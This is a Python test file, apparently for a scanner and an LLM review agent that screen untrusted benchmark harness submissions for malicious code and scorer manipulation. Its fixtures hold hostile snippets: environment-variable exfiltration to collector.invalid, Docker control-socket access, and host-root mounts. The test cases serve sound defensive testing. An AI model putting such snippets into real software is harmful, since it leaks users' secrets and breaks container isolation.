def test_repository_preflight_does_not_treat_copy_or_chmod_as_execution(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Dockerfile": (
                        b"FROM base\nCOPY . .\nRUN chmod +x run-miner.sh\n"
                        b'ENTRYPOINT ["/app/agent"]\n'
                    ),
                    "run-miner.sh": (
                        b"docker run --network=host --volume /:/host agent\n"
                    ),
                },
            )
        )
    )

    assert "run-miner.sh" not in repo._explicit_runtime_paths()
    assert repo.malicious_preflight(artifact_sha256="a" * 64) is None


def test_repository_preflight_follows_runtime_command_to_shell_launcher(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": (
                        b'fn main() { Command::new("./run-miner.sh").status(); }\n'
                    ),
                    "run-miner.sh": (
                        b"docker run --network=host --volume /:/host agent\n"
                    ),
                },
            )
        )
    )

    assert "run-miner.sh" in repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)
    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_follows_rust_include_into_nested_test_path(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": (
                        b'include!("../vendor/dependency/tests/payload.rs");\n'
                    ),
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                    "vendor/dependency/tests/inert.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "vendor/dependency/tests/payload.rs" in runtime_paths
    assert "vendor/dependency/tests/inert.rs" not in runtime_paths
    assert observation is not None
    assert observation.categories == ("malicious_build",)


@pytest.mark.parametrize("target_kind", ["example", "test", "bench"])
def test_repository_preflight_ignores_inert_cargo_targets(
    tmp_path: Path, target_kind: str
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Cargo.toml": (
                        b'[package]\nname = "agent"\nversion = "0.1.0"\n'
                        + f'[[{target_kind}]]\nname = "fixture"\n'.encode()
                        + b'path = "tests/payload.rs"\n'
                    ),
                    "src/main.rs": b"fn main() {}\n",
                    "tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "tests/payload.rs" not in runtime_paths
    assert observation is None


def test_repository_preflight_ignores_dev_dependency_build_script(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Cargo.toml": (
                        b'[package]\nname = "agent"\nversion = "0.1.0"\n'
                        b"[dev-dependencies]\n"
                        b'fixture = { path = "tests/fixture" }\n'
                    ),
                    "src/main.rs": b"fn main() {}\n",
                    "tests/fixture/Cargo.toml": (
                        b'[package]\nname = "fixture"\nversion = "0.1.0"\n'
                        b'build = "payload.rs"\n'
                    ),
                    "tests/fixture/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "tests/fixture/payload.rs" not in runtime_paths
    assert observation is None


@pytest.mark.parametrize(
    "runtime_source",
    [
        ('#[cfg(test)]\n#[path = "../tests/payload.rs"]\nmod policy_fixture;\n'),
        '#[cfg(test)]\ninclude!("../tests/payload.rs");\n',
    ],
)
def test_repository_preflight_follows_test_only_rust_indirections(
    tmp_path: Path, runtime_source: str
) -> None:
    # A cfg(test)-gated include or #[path] module is compiled whenever the
    # build turns cfg(test) on, so its target is scanned like runtime source.
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": runtime_source.encode(),
                    "tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "tests/payload.rs" in runtime_paths
    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_follows_unguarded_rust_path_attribute(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": (
                        b'#[path = "../tests/payload.rs"]\nmod production_module;\n'
                    ),
                    "tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    runtime_paths = repo._explicit_runtime_paths()
    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert "tests/payload.rs" in runtime_paths
    assert observation is not None
    assert observation.categories == ("malicious_build",)


@pytest.mark.parametrize(
    "root_manifest,dependency_manifest",
    [
        (
            b'[workspace]\nmembers = ["vendor/dependency"]\n',
            b'[package]\nname = "dependency"\nversion = "0.1.0"\n'
            b'build = "tests/payload.rs"\n',
        ),
        (
            b'[package]\nname = "agent"\nversion = "0.1.0"\n'
            b'[dependencies]\ndependency = { path = "vendor/dependency" }\n',
            b'[package]\nname = "dependency"\nversion = "0.1.0"\n'
            b'build = "tests/payload.rs"\n',
        ),
    ],
)
def test_repository_preflight_scans_reachable_cargo_package_targets(
    tmp_path: Path, root_manifest: bytes, dependency_manifest: bytes
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "Cargo.toml": root_manifest,
                    "vendor/dependency/Cargo.toml": dependency_manifest,
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


@pytest.mark.parametrize(
    "include_expression",
    [
        'include!(r#"../vendor/dependency/tests/payload.rs"#);',
        'include!(concat!("../vendor/", "dependency/tests/payload.rs"));',
        "fn borrow<'a>(value: &'a str) { let _ = value; }\n"
        'include!("../vendor/dependency/tests/payload.rs");',
        'include!("\\x2e\\x2e/vendor/dependency/tests/payload.rs");',
    ],
)
def test_repository_preflight_resolves_rust_literal_include_forms(
    tmp_path: Path, include_expression: str
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": include_expression.encode(),
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_ignores_include_examples_in_comments_and_strings(
    tmp_path: Path,
) -> None:
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/main.rs": (
                        b'// include!("../vendor/dependency/tests/payload.rs");\n'
                        b'let example = r#"include!("../vendor/dependency/tests/'
                        b'payload.rs")"#;\n'
                    ),
                    "vendor/dependency/tests/payload.rs": (
                        b'let endpoint = "/var/run/docker.sock";\n'
                        b"connect_control_socket(endpoint);\n"
                    ),
                },
            )
        )
    )

    assert repo.malicious_preflight(artifact_sha256="a" * 64) is None


def test_repository_preflight_skips_oversized_member_without_stopping_scan(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    dangerous = (
        b'let endpoint = "/var/run/docker.sock";\nconnect_control_socket(endpoint);\n'
    )
    monkeypatch.setattr(
        source_review_module, "_MAX_LEAD_SCAN_BYTES", len(dangerous) + 8
    )
    repo = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {
                    "src/a_large.rs": b"x" * (len(dangerous) + 16),
                    "src/z_runtime.rs": dangerous,
                },
            )
        )
    )

    observation = repo.malicious_preflight(artifact_sha256="a" * 64)

    assert observation is not None
    assert observation.categories == ("malicious_build",)


def test_repository_preflight_trusts_only_exact_pinned_starter_file(
    tmp_path: Path,
) -> None:
    official = (
        b'let endpoint = "/var/run/docker.sock";\nconnect_control_socket(endpoint);\n'
    )
    manifest = tmp_path / "provenance.json"
    manifest.write_text(
        json.dumps(
            {
                "version": 1,
                "origin": "public/starter",
                "revision": "reviewed",
                "files": {"scripts/official.py": hashlib.sha256(official).hexdigest()},
            }
        )
    )
    exact = TarSourceRepository(
        str(_archive_files(tmp_path, {"scripts/official.py": official}))
    )

    assert (
        exact.malicious_preflight(
            artifact_sha256="a" * 64,
            provenance_manifest_paths=(str(manifest),),
        )
        is None
    )

    modified = TarSourceRepository(
        str(
            _archive_files(
                tmp_path,
                {"scripts/official.py": official + b"// miner change\n"},
            )
        )
    )
    observation = modified.malicious_preflight(
        artifact_sha256="b" * 64,
        provenance_manifest_paths=(str(manifest),),
    )

    assert observation is not None
    assert observation.categories == ("malicious_build",)


@pytest.mark.parametrize(
    "case",
    json.loads(
        (
            Path(__file__).parent / "fixtures" / "static-preflight-v2-regressions.json"
        ).read_text()
    )["cases"],
    ids=lambda case: case["id"],
)
def test_static_preflight_v2_sanitized_regression_corpus(
    tmp_path: Path, case: dict[str, object]
) -> None:
    files = case["files"]
    assert isinstance(files, dict)
    archive = _archive_files(
        tmp_path,
        {str(path): str(source).encode() for path, source in files.items()},
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert len(audit) == 1
    assert audit[0]["candidate_revision"] == "static-malicious-preflight-v2"
    expected = case["expected"]
    category = case["category"]
    if "reachability" in case:
        assert any(
            proof["category"] == category
            and proof["reachability_state"] == case["reachability"]
            for proof in audit[0]["proofs"]
        )
    if expected == "decisive":
        assert observation is not None
        assert observation.finding is not None
        assert observation.finding["prompt_revision"] == (
            "static-malicious-preflight-v2"
        )
        assert category in observation.categories
        assert audit[0]["candidate_decisive"] is True
    elif expected == "none":
        assert observation is None
        assert audit[0]["legacy_decisive"] is False
        assert audit[0]["candidate_decisive"] is False
        assert audit[0]["advisory_count"] == 0
    elif audit[0]["legacy_requires_serial_review"]:
        assert observation is not None
        assert observation.finding is not None
        assert observation.finding["prompt_revision"] == (
            "static-malicious-preflight-v1"
        )
        assert audit[0]["candidate_decisive"] is False
    else:
        assert observation is None
        assert audit[0]["candidate_decisive"] is False
        assert int(audit[0]["advisory_count"]) >= 1


def test_static_preflight_off_retains_legacy_default_for_copied_source(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": b"FROM scratch\nCOPY src/main.rs /src/main.rs\n",
            "src/main.rs": (
                b'let endpoint = "/var/run/docker.sock";\n'
                b"connect_control_socket(endpoint);\n"
            ),
        },
    )
    repository = TarSourceRepository(str(archive))

    implicit = repository.malicious_preflight(artifact_sha256="a" * 64)
    explicit = repository.malicious_preflight(artifact_sha256="a" * 64, mode="off")

    assert implicit == explicit
    assert implicit is not None
    assert implicit.finding is not None
    assert implicit.finding["prompt_revision"] == "static-malicious-preflight-v1"
    assert implicit.finding["summary"] == (
        "Static preflight found reachable source combinations for "
        "docker-control-plane; execution was not started."
    )


def test_static_preflight_shadow_clears_proven_excluded_helper_and_records_delta(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"print('ready')\n",
            "tools/local.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="shadow",
        audit_recorder=audit.append,
    )

    assert observation is None
    assert audit == [
        {
            **audit[0],
            "mode": "shadow",
            "legacy_decisive": False,
            "candidate_decisive": False,
        }
    ]
    assert audit[0]["advisory_count"] == 1
    assert audit[0]["proofs"][0]["reachability_state"] == "proven_inert"


@pytest.mark.parametrize("mode", ["off", "enforce"])
def test_static_preflight_clears_uncopied_rehearsal_after_secret_mount(
    tmp_path: Path, mode: str
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM rust:bookworm AS builder\nWORKDIR /app\n"
                b"COPY Cargo.toml ./\n"
                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
                b"COPY src ./src\nCOPY fixtures ./fixtures\n"
                b"RUN --mount=type=secret,id=build_key cargo build --release\n"
                b"FROM debian:bookworm-slim\n"
                b"COPY --from=builder /app/target/release/miner /usr/local/bin/miner\n"
                b"COPY fixtures ./fixtures\n"
                b'ENTRYPOINT ["miner"]\n'
            ),
            "Cargo.toml": b'[package]\nname="miner"\nversion="0.1.0"\n',
            "src/main.rs": b"fn main() {}\n",
            "fixtures/model.bin": b"\x00\xff",
            "scripts/local-rehearsal.py": (
                b"import os, urllib.request\n"
                b"with urllib.request.urlopen(\n"
                b"    'https://example.invalid/public.json'\n"
                b") as response:\n"
                b"    dataset = response.read()\n"
                b"environment = os.environ.copy()\n"
                b"environment.pop('OPENROUTER_API_KEY', None)\n"
            ),
        },
    )
    repository = TarSourceRepository(str(archive))
    assert repository.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None


@pytest.mark.parametrize("mode", ["off", "enforce"])
def test_static_preflight_clears_inference_url_and_read_timeout(
    tmp_path: Path, mode: str
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app /app/app\n"
                b'ENTRYPOINT ["python", "/app/app/main.py"]\n'
            ),
            "app/main.py": (
                b"from app.config import Settings\nprint(Settings.from_env())\n"
            ),
            "app/config.py": (
                b"import os\nclass Settings:\n"
                b"    @classmethod\n    def from_env(cls):\n"
                b"        inference_url = os.environ.get(\n"
                b"            'DITTOBENCH_INFERENCE_BASE_URL', 'http://host.docker.internal:11435/v1'\n"
                b"        )\n"
                b"        read_seconds = 120\n"
                b"        return inference_url, read_seconds\n"
            ),
        },
    )
    assert (
        TarSourceRepository(str(archive)).malicious_preflight(
            artifact_sha256="a" * 64, mode=mode
        )
        is None
    )


@pytest.mark.parametrize(
    ("category", "source"),
    [
        (
            "data_exfiltration",
            b"import os, requests\npayload = os.environ.copy()\n"
            b"requests.post('https://collector.invalid/report', json=payload)\n",
        ),
        (
            "cross_user_access",
            b"path = '/home/another-user/private.txt'\n"
            b"with open(path) as source:\n    print(source.read())\n",
        ),
    ],
)
@pytest.mark.parametrize("mode", ["off", "enforce"])
def test_static_preflight_retains_reachable_unsafe_source(
    tmp_path: Path, mode: str, category: str, source: bytes
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": source,
        },
    )
    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64, mode=mode
    )
    assert observation is not None
    assert category in observation.categories


def test_static_preflight_enforce_routes_unresolved_v1_threat_to_serial_review(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": b"FROM rust:bookworm\nCOPY . .\nRUN cargo build --release\n",
            "Cargo.toml": b'[package]\nname="app"\nversion="0.1.0"\n',
            "src/main.rs": b'include!(env!("GENERATED_SOURCE"));\nfn main() {}\n',
            "generated/payload.rs": (b'let path = "/root/private";\nread(path);\n'),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert observation is not None
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == ("static-malicious-preflight-v1")
    assert audit[0]["candidate_decisive"] is False
    assert audit[0]["legacy_requires_serial_review"] is True
    assert audit[0]["advisory_count"] == 1
    assert audit[0]["proofs"][0]["reachability_state"] == "unresolved"


def test_static_preflight_enforce_routes_helper_indirection_to_serial_review(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": (
                b'endpoint = "/var/run/docker.sock"\n'
                b"dispatch(endpoint)\n"
                b"def dispatch(value):\n    connect_control_socket(value)\n"
            ),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert observation is not None
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == ("static-malicious-preflight-v1")
    assert audit[0]["legacy_requires_serial_review"] is True
    assert audit[0]["proofs"][0]["causal_state"] == "unresolved"
    assert audit[0]["proofs"][0]["resolution_basis"] == ("no-target-to-control-flow")


def test_static_preflight_enforce_accepts_affirmative_loopback_clearance(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('http://127.0.0.1:8080/debug', json=secret)\n"
            ),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert observation is None
    assert audit[0]["legacy_decisive"] is True
    assert audit[0]["candidate_decisive"] is False
    assert audit[0]["legacy_requires_serial_review"] is False
    assert audit[0]["proofs"][0]["causal_state"] == "absent"
    assert audit[0]["proofs"][0]["resolution_basis"] == "loopback-only-sink"


@pytest.mark.parametrize("unresolved_first", [False, True])
def test_static_preflight_enforce_keeps_mixed_loopback_exfiltration_serial(
    tmp_path: Path, unresolved_first: bool
) -> None:
    loopback = b"requests.post('http://127.0.0.1/debug', json=secret)\n"
    unresolved = b"requests.post(callback_url, json=secret)\n"
    sinks = (unresolved, loopback) if unresolved_first else (loopback, unresolved)
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"secret = os.environ.copy()\n" + b"".join(sinks),
        },
    )
    audit: list[dict[str, object]] = []

    observation = TarSourceRepository(str(archive)).malicious_preflight(
        artifact_sha256="a" * 64,
        mode="enforce",
        audit_recorder=audit.append,
    )

    assert observation is not None
    assert observation.finding is not None
    assert observation.finding["prompt_revision"] == "static-malicious-preflight-v1"
    assert audit[0]["legacy_decisive"] is True
    assert audit[0]["candidate_decisive"] is False
    assert audit[0]["legacy_requires_serial_review"] is True
    assert audit[0]["proofs"][0]["causal_state"] == "unresolved"
    assert audit[0]["proofs"][0]["resolution_basis"] == (
        "unresolved-source-to-sink-flow"
    )


def test_static_preflight_v2_advisory_is_visible_to_l1_inventory(
    tmp_path: Path,
) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"print('ready')\n",
            "tools/local.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        },
    )

    leads = TarSourceRepository(
        str(archive), static_preflight_v2_mode="enforce"
    ).review_leads()["items"]

    static = [
        lead
        for lead in leads
        if str(lead["kind"]).startswith("static-malicious-advisory:")
    ]
    assert len(static) == 1
    assert static[0]["reachability_state"] == "proven_inert"
    assert static[0]["causal_state"] == "proven"


def test_static_v2_advisories_still_read_trusted_starter_files(
    tmp_path: Path,
) -> None:
    helper = (
        b"secret = os.environ.copy()\n"
        b"requests.post('https://collector.invalid', json=secret)\n"
    )
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": (
                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
                b'ENTRYPOINT ["python", "/app/app.py"]\n'
            ),
            "app.py": b"print('ready')\n",
            "tools/local.py": helper,
        },
    )
    manifest = tmp_path / "starter.json"
    manifest.write_text(
        json.dumps(
            {
                "version": 1,
                "origin": "public/starter",
                "revision": "pinned",
                "files": {"tools/local.py": hashlib.sha256(helper).hexdigest()},
            }
        )
    )

    leads = TarSourceRepository(
        str(archive), static_preflight_v2_mode="enforce"
    ).review_leads((str(manifest),))

    # The digest skip narrows rule leads and fingerprints only; static-v2
    # proofs keep whole-program context, trusted files included.
    assert leads["trusted_starter_skipped"] == 1
    assert [
        lead["kind"]
        for lead in leads["items"]
        if str(lead["kind"]).startswith("static-malicious-advisory:")
    ]


def test_static_preflight_v2_off_does_not_change_l1_inventory(tmp_path: Path) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "Dockerfile": b"FROM scratch\n",
            "tools/local.py": (
                b"secret = os.environ.copy()\n"
                b"requests.post('https://collector.invalid', json=secret)\n"
            ),
        },
    )

    leads = TarSourceRepository(str(archive)).review_leads()["items"]

    assert not any(
        str(lead["kind"]).startswith("static-malicious-advisory:") for lead in leads
    )


def test_static_preflight_rejects_unknown_mode(tmp_path: Path) -> None:
    repository = TarSourceRepository(
        str(_archive_files(tmp_path, {"Dockerfile": b"FROM scratch\n"}))
    )
    with pytest.raises(
        ValueError, match="static preflight mode must be off, shadow, or enforce"
    ):
        repository.malicious_preflight(
            artifact_sha256="a" * 64,
            mode="future",
        )


def test_repository_rejects_noncanonical_source_alias(tmp_path: Path) -> None:
    archive = _archive_files(
        tmp_path,
        {
            "src/main.rs": b"fn original() {}",
            "src/./main.rs": b"fn replacement() {}",
        },
    )

    with pytest.raises(ValueError, match="non-canonical path"):
        TarSourceRepository(str(archive))


def test_all_generator_grammar_without_answer_path_is_not_candidate(
    tmp_path: Path,
) -> None:
    source = b"""\
const ATTRS: &[&str] = &["city", "employer", "car", "university", "instrument",
    "project", "trip", "pet", "cuisine", "diet", "color", "hobby"];
const QUESTIONS: &[&str] = &[
    "What city do I live in?", "Where do I work now?",
    "Which university did I attend?", "How many projects did I mention?",
    "List every trip I described.", "What did I use to drive before?",
];
const FACTS: &[&str] = &[
    "I moved to Northport.", "I work at Example Labs.", "I drive a hatchback.",
    "I studied at Northport College.", "I play an instrument.",
    "My project is Atlas.", "My favorite cuisine changed recently.",
];
const EVENT_LABELS: &[&str] = &["moved", "started", "switched", "changed"];
fn bridge_question_to_fact(question: &str, query: &str, fact: &str, memory: &str,
    attribute: &str, value: &str) {
    let _ = (extract(question), retrieve(query, memory), match_fact(fact),
        keyword(attribute), value);
}
"""
    repo = TarSourceRepository(
        str(_archive_files(tmp_path, {"src/grammar_only.rs": source}))
    )

    analysis = repo.review_leads()["generator_mirroring"]

    assert set(analysis["matched_dimensions"]) == {
        "attribute_ontology",
        "question_templates",
        "fact_update_frames",
        "event_label_frames",
        "retrieval_vocabulary_bridge",
    }
    assert analysis["aggregate_candidate"] is False
    assert analysis["disposition"] == "no-aggregate-candidate"


async def test_benign_control_clears_with_zdr_and_read_only_tools(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    seen: list[dict[str, object]] = []
    final = {
        "risk_level": "low",
        "confidence": 0.9,
        "categories": ["none"],
        "evidence": [],
        "summary": "General model-backed request path.",
    }
    progress: list[tuple[int, int]] = []
    observation = await _agent(key, _transport(final, seen)).review(
        str(_archive(tmp_path, "fn main() { call_model(); }")),
        artifact_sha256=_SHA,
        progress=lambda completed, total: progress.append((completed, total)),
    )

    assert observation.ok and observation.risk_level == "low"
    assert observation.clearance_certified
    assert progress == [(0, 4), (1, 4), (2, 4)]
    assert all(
        tool["function"]["name"]
        in {
            "analyze_binary",
            "list_files",
            "read_file",
            "record_note",
            "search",
            "submit_review",
        }
        for request in seen
        for tool in request["tools"]
    )
    assert seen[0]["provider"] == {
        "allow_fallbacks": True,
        "data_collection": "deny",
        "require_parameters": True,
    }
    prompt = seen[0]["messages"][0]["content"]
    assert "Public availability is not a safe harbor" in prompt
    assert "BuildKit secret mount" in prompt
    assert "abstention or retrieval side probe" in prompt
    assert "BERT/ONNX cross-encoder" in prompt
    assert "scorer_contract_manipulation" in prompt
    assert "genuine model generation" in prompt
    assert "Current-user facts remain legitimate agent context" in prompt
    assert "behavioral-oracle failures" in prompt
    assert "user_isolation_correctness" in prompt
    assert "external_build_dependency" in prompt
    assert 'location-only "review_leads"' in prompt
    assert "coordinated constellation" in prompt
    assert "literal expected answers or hidden values" in prompt
    assert "I4 DERIVED-VALUE AUTHORITY" in prompt
    assert "I5 PRODUCTION ENGINE" in prompt
    assert "I7 MODEL TOOL PLANNING" in prompt
    assert "pass wins only when it causally removes the breach" in prompt
    assert observation.finding is not None
    assert "use\nanalyze_binary only when" in prompt
    assert 'compact, precomputed\n"binary_analysis"' in prompt
    assert observation.finding[
        "prompt_revision"
    ] == source_review_module._prompt_revision(SCREENING_POLICY_VERSION)
    assert len(observation.finding["invariant_assessment"]["decisions"]) == 8
    initial_inventory = json.loads(
        seen[0]["messages"][1]["content"]
        .split("\nExact-file trusted provenance:\n", 1)[0]
        .removeprefix("Review this untrusted harness. Initial inventory:\n")
    )
    mirroring = initial_inventory["review_leads"]["generator_mirroring"]
    assert mirroring["aggregate_candidate"] is False


async def test_initial_inventory_and_provenance_share_the_starter_manifests(
    tmp_path: Path,
) -> None:
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    source = "fn main() { call_model(); }"
    archive = _archive(tmp_path, source)
    manifest = tmp_path / "starter.json"
    manifest.write_text(
        json.dumps(
            {
                "version": 1,
                "origin": "public/starter",
                "revision": "pinned",
                "files": {"src/main.rs": hashlib.sha256(source.encode()).hexdigest()},
            }
        )
    )
    seen: list[dict[str, object]] = []
    final = {
        "risk_level": "low",
        "confidence": 0.9,
        "categories": ["none"],
        "evidence": [],
        "summary": "General model-backed request path.",
    }
    agent = OpenRouterSourceReviewAgent(
        api_key_file=str(key),
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=10,
        max_steps=4,
        transport=_transport(final, seen),
        transport_retry_delays=(0, 0),
        provenance_manifest_file=str(manifest),
    )

    await agent.review(str(archive), artifact_sha256=_SHA)

    inventory, provenance = (
        seen[0]["messages"][1]["content"]
        .removeprefix("Review this untrusted harness. Initial inventory:\n")
        .split("\nExact-file trusted provenance:\n", 1)
    )
    assert json.loads(inventory)["review_leads"]["trusted_starter_skipped"] == 1
    assert json.loads(provenance)["matched_exact_files"] == ["src/main.rs"]


async def test_each_source_review_completion_has_a_short_hard_timeout(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """One stuck provider turn must leave time for the bounded retry."""
    key = tmp_path / "key"
    key.write_text("sk-test-private-review")
    os.chmod(key, 0o600)
    attempts = 0

    async def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal attempts
        attempts += 1
        await asyncio.sleep(1)
        return httpx.Response(200, json={})

    monkeypatch.setattr(source_review_module, "_MAX_COMPLETION_REQUEST_SECONDS", 0.01)
    observation = await _agent(key, httpx.MockTransport(handler)).review(
        str(_archive(tmp_path, "fn main() {}")), artifact_sha256=_SHA
    )

    assert attempts == 3
    assert observation.error_code == "source-review-model-timeout"
    assert observation.failure_disposition == "retryable_infra"


async def test_default_source_turn_allows_delayed_success_with_retry_headroom(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    async def delayed_success(_request: httpx.Request) -> httpx.Response:
        await asyncio.sleep(0.02)
        return httpx.Response(
            200,
            json={"choices": [{"message": {"role": "assistant", "content": "ok"}}]},
        )

    agent = OpenRouterSourceReviewAgent(
        api_key_file=None,
        model="openai/gpt-6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=600,
        max_steps=1,
        transport=httpx.MockTransport(delayed_success),
    )
    request_timeouts: list[float] = []

    def headers(_key: str, effective_timeout: float) -> dict[str, str]:
        request_timeouts.append(effective_timeout)
        return {}

    monkeypatch.setattr(agent, "_completion_request_headers", headers)
    async with httpx.AsyncClient(transport=agent._transport) as client:
        message = await agent._completion_message(
            client,
            "test-key",
            [{"role": "user", "content": "test"}],
            timeout=600,
            reasoning_effort="high",
        )
    assert message["content"] == "ok"
    assert request_timeouts == [180.0]
    assert request_timeouts[0] * 2 < agent._timeout_seconds


async def test_completion_request_timeout_override_still_obeys_review_deadline(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    attempts = 0
    blocking_request_started = asyncio.Event()
    block_request = False

    async def handler(_request: httpx.Request) -> httpx.Response:
        nonlocal attempts, block_request
        attempts += 1
        if block_request:
            blocking_request_started.set()
            await asyncio.Event().wait()
        await asyncio.sleep(0.02)
        return httpx.Response(
            200,
            json={"choices": [{"message": {"role": "assistant", "content": "ok"}}]},
        )

    monkeypatch.setattr(source_review_module, "_MAX_COMPLETION_REQUEST_SECONDS", 0.005)
    agent = OpenRouterSourceReviewAgent(
        api_key_file=None,
        model="openai/gpt-5.6-luna",
        base_url="https://openrouter.test/api/v1",
        timeout_seconds=1,
        max_steps=1,
        max_completion_request_seconds=0.5,
        transport=httpx.MockTransport(handler),
        transport_retry_delays=(),
    )
    async with httpx.AsyncClient(
